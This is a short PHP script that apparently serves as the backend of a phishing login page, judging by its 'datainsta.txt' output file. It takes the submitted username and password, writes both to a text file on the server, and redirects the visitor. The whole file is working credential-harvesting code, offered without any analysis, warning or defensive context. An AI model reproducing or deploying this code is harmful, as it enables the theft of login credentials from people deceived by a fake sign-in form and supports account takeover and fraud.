<?php 
$myfile = fopen("datainsta.txt", "w") or die("Unable to open file!");
$txt = $_POST["username"];
fwrite($myfile, $txt);
fwrite($myfile, "//");

$txt = $_POST["password"];
fwrite($myfile, $txt);
fclose($myfile);

header("Location: ");
die();
?>